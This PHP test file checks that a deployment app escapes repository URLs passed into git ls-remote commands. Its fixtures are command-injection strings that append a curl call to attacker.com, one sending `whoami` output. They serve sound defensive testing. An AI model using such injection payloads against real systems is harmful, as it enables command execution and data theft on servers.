<?php

use App\Models\Application;
use App\Models\GithubApp;
use App\Models\PrivateKey;

afterEach(function () {
    Mockery::close();
});

it('escapes malicious repository URLs in deploy_key type', function () {
    // Arrange: Create a malicious repository URL
    $maliciousRepo = 'git@github.com:user/repo.git;curl https://attacker.com/ -X POST --data `whoami`';
    $deploymentUuid = 'test-deployment-uuid';

    // Mock the application
    $application = Mockery::mock(Application::class)->makePartial();
    $application->git_branch = 'main';
    $application->shouldReceive('deploymentType')->andReturn('deploy_key');
    $application->shouldReceive('customRepository')->andReturn([
        'repository' => $maliciousRepo,
        'port' => 22,
    ]);

    // Mock private key
    $privateKey = Mockery::mock(PrivateKey::class)->makePartial();
    $privateKey->shouldReceive('getAttribute')->with('private_key')->andReturn('fake-private-key');
    $application->shouldReceive('getAttribute')->with('private_key')->andReturn($privateKey);

    // Act: Generate git ls-remote commands
    $result = $application->generateGitLsRemoteCommands($deploymentUuid, true);

    // Assert: The command should contain escaped repository URL
    expect($result)->toHaveKey('commands');
    $command = $result['commands'];

    // The malicious payload should be escaped (wrapped in single quotes) and not executed
    // escapeshellarg wraps the entire argument in single quotes, preventing shell interpretation
    expect($command)->toContain("'git@github.com:user/repo.git;curl https://attacker.com/ -X POST --data `whoami`'");

    // Verify the command properly escapes the argument by checking it's wrapped in quotes
    // The semicolon and backticks are safe because they're inside single-quoted string
    expect($command)->toMatch("/docker exec.*'git@github.com:user\\/repo\\.git;curl/");
});

it('escapes malicious repository URLs in source type with public repo', function () {
    // Arrange: Create a malicious repository name
    $maliciousRepo = "user/repo';curl https://attacker.com/";
    $deploymentUuid = 'test-deployment-uuid';

    // Mock the application
    $application = Mockery::mock(Application::class)->makePartial();
    $application->git_branch = 'main';
    $application->shouldReceive('deploymentType')->andReturn('source');
    $application->shouldReceive('customRepository')->andReturn([
        'repository' => $maliciousRepo,
        'port' => 22,
    ]);

    // Mock GithubApp source
    $source = Mockery::mock(GithubApp::class)->makePartial();
    $source->shouldReceive('getAttribute')->with('html_url')->andReturn('https://github.com');
    $source->shouldReceive('getAttribute')->with('is_public')->andReturn(true);
    $source->shouldReceive('getMorphClass')->andReturn('App\Models\GithubApp');

    $application->shouldReceive('getAttribute')->with('source')->andReturn($source);
    $application->source = $source;

    // Act: Generate git ls-remote commands
    $result = $application->generateGitLsRemoteCommands($deploymentUuid, true);

    // Assert: The command should contain escaped repository URL
    expect($result)->toHaveKey('commands');
    $command = $result['commands'];

    // The command should contain the escaped URL (escapeshellarg wraps in single quotes)
    expect($command)->toContain("'https://github.com/user/repo'\\''");
});

it('escapes repository URLs in other deployment type', function () {
    // Arrange: Create a malicious repository URL
    $maliciousRepo = "https://github.com/user/repo.git';curl https://attacker.com/";
    $deploymentUuid = 'test-deployment-uuid';

    // Mock the application
    $application = Mockery::mock(Application::class)->makePartial();
    $application->git_branch = 'main';
    $application->shouldReceive('deploymentType')->andReturn('other');
    $application->shouldReceive('customRepository')->andReturn([
        'repository' => $maliciousRepo,
        'port' => 22,
    ]);

    // Act: Generate git ls-remote commands
    $result = $application->generateGitLsRemoteCommands($deploymentUuid, true);

    // Assert: The command should contain escaped repository URL
    expect($result)->toHaveKey('commands');
    $command = $result['commands'];

    // The malicious payload should be escaped (escapeshellarg wraps and escapes quotes)
    expect($command)->toContain("'https://github.com/user/repo.git'\\''");
});
